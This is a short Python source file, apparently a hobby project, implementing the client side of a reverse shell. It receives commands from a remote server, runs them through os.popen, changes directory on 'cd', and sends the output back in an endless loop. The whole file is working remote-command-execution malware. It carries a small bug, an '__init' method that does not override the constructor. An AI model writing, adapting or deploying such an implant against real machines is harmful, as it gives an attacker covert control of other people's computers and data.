import os
from client import *


class ClientReverseShell(Client):
    def __init(self,server_ip,server_port):
        super().__init__(server_ip,server_port)

    def exec_command(self):
        #getting the command from the server
        self.comm_to_exec = self.recv_data()
        #executing the command on the client machine(the machine on which this script will run)
        #the special case  of wanting to change the directory
        if "cd" == self.comm_to_exec.strip()[:2]:
            dir = self.comm_to_exec[self.comm_to_exec.index('d')+1:].lstrip()
            os.chdir(dir)
            cwd = os.popen('pwd').read()
            self.send_data(f"directory has been changed to {cwd}")
            self.comm_res = f"directory has been changes to {cwd}"
        #the normal case of just wanting to execute a command
        else:
            exec_comm = os.popen(self.comm_to_exec)
            #sending the command response back to the server
            self.comm_res = exec_comm.read()
            self.send_data(self.comm_res)

#quick testing of the reverse shell client
if __name__ == "__main__":
    client = ClientReverseShell(socket.gethostname(),9999)
    while True:
        client.exec_command()
